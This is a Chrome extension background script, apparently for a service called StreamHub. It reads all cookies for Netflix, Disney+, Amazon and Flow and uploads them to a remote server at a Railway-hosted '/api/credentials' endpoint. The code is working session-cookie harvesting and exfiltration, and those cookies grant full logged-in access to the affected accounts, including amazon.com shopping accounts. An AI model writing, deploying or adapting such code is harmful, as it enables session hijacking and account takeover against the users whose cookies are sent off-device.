// ── StreamHub Connector - Background Service Worker ──

const PLATFORM_COOKIE_DOMAINS = {
  netflix: ['netflix.com', 'www.netflix.com'],
  disney:  ['disneyplus.com', 'www.disneyplus.com', 'disney.com'],
  amazon:  ['primevideo.com', 'www.primevideo.com', 'amazon.com', 'www.amazon.com'],
  flow:    ['flow.com.ar', 'www.flow.com.ar']
};

const STREAMHUB_ORIGINS = [
  'https://streamhub-production-0416.up.railway.app',
  'http://localhost:3000'
];

chrome.runtime.onMessageExternal.addListener((message, sender, sendResponse) => {
  if (!STREAMHUB_ORIGINS.includes(sender.origin)) {
    sendResponse({ error: 'Unauthorized origin' });
    return true;
  }

  if (message.action === 'ping') {
    sendResponse({ ok: true, version: '1.0' });
    return true;
  }

  if (message.action === 'getCookies') {
    const { platform, token } = message;
    const domains = PLATFORM_COOKIE_DOMAINS[platform];
    if (!domains) { sendResponse({ error: 'Unknown platform' }); return true; }

    // Get cookies from ALL domains for this platform
    Promise.all(domains.map(d => 
      chrome.cookies.getAll({ domain: d })
    ))
    .then(results => {
      // Deduplicate cookies by name+domain
      const seen = new Set();
      const cookies = results.flat().filter(c => {
        const key = `${c.name}:${c.domain}`;
        if (seen.has(key)) return false;
        seen.add(key);
        return true;
      });

      console.log(`[StreamHub] ${platform}: captured ${cookies.length} cookies from ${domains.join(', ')}`);

      if (cookies.length === 0) {
        sendResponse({ error: `No ${platform} cookies found. Please make sure you are logged in to ${platform} in this browser.` });
        return;
      }

      // Send to StreamHub server
      fetch('https://streamhub-production-0416.up.railway.app/api/credentials', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`
        },
        body: JSON.stringify({ platform, cookies })
      })
      .then(r => r.json())
      .then(data => {
        console.log(`[StreamHub] saved ${platform} session:`, data);
        sendResponse({ ok: true, cookieCount: cookies.length });
      })
      .catch(e => sendResponse({ error: e.message }));
    })
    .catch(e => sendResponse({ error: e.message }));

    return true; // keep channel open for async
  }
});

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.action === 'ping') sendResponse({ ok: true });
  return true;
});
